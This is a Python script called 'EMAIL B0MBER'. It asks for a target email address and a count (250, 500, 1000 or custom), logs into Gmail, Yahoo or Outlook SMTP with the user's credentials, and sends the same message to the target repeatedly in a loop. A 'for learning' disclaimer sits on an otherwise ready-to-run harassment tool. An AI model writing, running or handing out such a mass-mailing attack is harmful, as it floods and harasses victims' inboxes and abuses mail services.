
import os
import smtplib
import getpass
import sys
import time


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.RED + 'EMAIL B0MBER')
    print(bcolors.YELLOW + '𝙄 𝙖𝙢 𝙣𝙤𝙩 𝙧𝙚𝙨𝙥𝙤𝙣𝙨𝙞𝙗𝙡𝙚 𝙛𝙤𝙧 𝙖𝙣𝙮 𝙩𝙝𝙞𝙣𝙜 𝙮𝙤𝙪 𝙙𝙤 𝙬𝙞𝙩𝙝 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙏𝙝𝙞𝙨 𝙞𝙨 𝙟𝙪𝙨𝙩 𝙛𝙤𝙧 𝙡𝙚𝙖𝙧𝙣𝙞𝙣𝙜 𝙖𝙣𝙙 𝙠𝙣𝙤𝙬𝙡𝙚𝙙𝙜𝙚 𝙥𝙪𝙧𝙥𝙤𝙨𝙚.')
    print(bcolors.RED + '''               ____  ___    _   _______ ____  ____ __________
                                         / __ \/   |  / | / / ___// __ \( __ )__  /__  /
                                        / /_/ / /| | /  |/ /\__ \/ / / / __  | / /  / / 
                                       / _, _/ ___ |/ /|  /___/ / /_/ / /_/ / / /  / /  
                                      /_/ |_/_/  |_/_/ |_//____/\____/\____/ /_/  /_/ ''')   
                                                  


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.GREEN + 'Loading')
            self.target = str(input(bcolors.RED + 'Enter target email : '))
            self.mode = int(input(bcolors.RED + 'Enter B0MB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.GREEN + 'Setting Up')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.RED + 'Choose a CUSTOM amount : '))
            print(bcolors.GREEN + f'\n You have selected BOMB mode: {self.mode} and {self.amount} emails')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.GREEN + ' Setting up email ')
            self.server = str(input(bcolors.RED + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.RED + 'Enter from address <: '))
            self.fromPwd = str(input(bcolors.RED + 'Enter from password <: '))
            self.subject = str(input(bcolors.RED + 'Enter subject <: '))
            self.message = str(input(bcolors.RED + 'Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.GREEN + '\nAttacking...')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.GREEN + '\nAttack finished ')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
